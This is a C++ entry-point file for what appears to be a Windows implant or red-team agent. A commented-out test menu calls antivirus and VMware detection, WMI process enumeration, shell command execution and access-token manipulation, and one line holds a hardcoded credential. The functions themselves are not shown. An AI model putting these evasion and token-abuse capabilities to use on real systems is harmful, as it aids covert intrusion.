// ConsoleApplication2.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include <stdio.h>
#include <queue>
#include "AgentGlobals.h"
#include "AgentOrchestrator.h"

// Set up env
// Global variable declaration 
json agentJson;
json agentSendJson;
json agentReturnJson;
json agentCodes;
json agentLogJson;
json agentProcessMonitorLog;
json agentServiceMonitorLog;
std::queue <json> hostEventContainer;
std::vector<std::string> agentLogArray = {};
std::vector<std::string> agentJobArray = {};

int main(int iArgCnt, char ** argv)
{	

	AgentOrchestrator orch;
	orch.coreOrchestrator();
	//WmiProcMon(1);
	////
	//int choice;
	//bool gameOn = true;
	//while (gameOn != false) {
	//	cout << endl;
	//	cout << "*******************************\n";
	//	cout << " 1 - Detect if AV is present\n";
	//	cout << " 2 - Conduct a ProcQuery\n";
	//	cout << " 3 - Conduct ProcMon\n";
	//	cout << " 4 - Conduct a FileFind\n";
	//	cout << " 5 - Perform a Tasklist\n";
	//	cout << " 6 - Perform VM Saftey Checks\n";
	//	cout << " Enter your choice and press return: ";

	//	cin >> choice;

	//	switch (choice)
	//	{
	//	case 1:
	//		cout << "[*] Attempting to look for AV\n";
	//		{ 
	//			AgentAvDetect av;
	//			wchar_t DriverName[1024] = L"lltdio.sys";
	//			if (av.ActiveDriver(DriverName))
	//			{
	//				std::cout << "Enumeration of Drivers is Ok" << std::endl;
	//			}
	//			if (av.EndPoint())
	//			{
	//				std::cout << "EndPoint Protection Installed" << std::endl;
	//			}
	//			if (av.KEndPoint())
	//			{
	//				std::cout << "Kaspersky EndPoint Protection Installed" << std::endl;
	//			}
	//		}
	//		break;
	//	case 2:
	//		cout << "[*] using wmi to enumerate detailed process listing ";
	//		WmiProcQuey(1);
	//		break;
	//	case 3:
	//		cout << "Ahahah, you really think I will help you?\n";
	//		WmiProcMon(1);
	//		Sleep(1000000);		
	//		break;
	//	case 4:
	//		cout << "End of Program.\n";
	//		{
	//			LPCWSTR targetFile = L"www.google.com";
	//			AgentFileFinder find;
	//			find.FileFind(targetFile);
	//		}
	//		gameOn = false;
	//		break;
	//	case 5:
	//		cout << "[*] Now Listing the Running Processes\n";
	//		{
	//			AgentPS PS;
	//			if (PS.AgentPSEnumID())
	//			{
	//				cout << "[*] Sucessfuly Gathred the ID's required\n";
	//			}
	//		}
	//		break;
	//	case 6:
	//		cout << "[*] Now Checking for VMmare localy\n";
	//		{
	//			AgentVMDetect VM;
	//			if (VM.AgentCheckVM())
	//			{
	//				cout << "[*] VMware detected localy!\n";
	//			}
	//		}
	//		break;
	//	case 7:
	//		cout << "[*] Now Running command\n";
	//		{
	//			std::string command = "dir";
	//			AgentShellCmd shell;
	//			shell.runShellCmd(command);
	//		}
	//		break;
	//	case 8:
	//		cout << "[*] Now Running command\n";
	//		{
	//			AgentToken token;
	//			token.revertToSelf();
	//		}
	//		break;
	//	case 9:
	//		cout << "[*] Now Running command\n";
	//		{
	//			AgentToken token;
	//			//token.makeToken(L"jay", L"83128312_AA_aa", L"Workgroup");
	//			token.enumCurrentToken();

	//		}
	//		break;
	//	default:
	//		cout << "Not a Valid Choice. \n";
	//		cout << "Choose again.\n";
	//		cin >> choice;
	//		break;
	//	}

	//}
	//Sleep(100000);


}

